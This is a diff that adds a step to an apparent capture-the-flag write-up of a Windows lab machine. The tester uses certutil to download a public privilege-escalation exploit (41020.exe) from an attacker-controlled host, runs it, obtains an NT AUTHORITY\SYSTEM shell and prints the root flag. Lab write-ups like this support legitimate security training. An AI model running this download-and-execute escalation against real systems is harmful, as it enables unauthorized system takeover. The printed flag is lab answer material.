@@ -500,3 +500,62 @@ ons Privilege Escalation, PoC
 [M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical                                
 [*] done                                                                                                      
 ```
+
+* Try https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+```
+C:\Users\kostas\Desktop>certutil -urlcache -split -f http://10.10.14.10/41020.exe C:\Users\kostas\Desktop\41020.exe
+
+certutil -urlcache -split -f http://10.10.14.10/41020.exe C:\Users\kostas\Desktop\41020.exe
+****  Online  ****
+  000000  ...
+  088c00
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\kostas\Desktop>
+C:\Users\kostas\Desktop>41020.exe
+41020.exe
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\Users\kostas\Desktop>whoami
+whoami
+nt authority\system
+
+C:\Users\kostas\Desktop>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 10.10.10.8
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.10.10.2
+
+Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:
+
+   Media State . . . . . . . . . . . : Media disconnected 
+   Connection-specific DNS Suffix  . : 
+
+C:\Users\kostas\Desktop>cd c:\Users\Administrator\Desktop
+cd c:\Users\Administrator\Desktop
+
+c:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is D0BC-0196
+
+ Directory of c:\Users\Administrator\Desktop
+
+18/03/2017  02:14     <DIR>          .
+18/03/2017  02:14     <DIR>          ..
+18/03/2017  02:14                 32 root.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  31.870.279.680 bytes free
+
+c:\Users\Administrator\Desktop>type root.txt
+type root.txt
+51ed1b36553c8461f4552c2e92b3eeed
+```
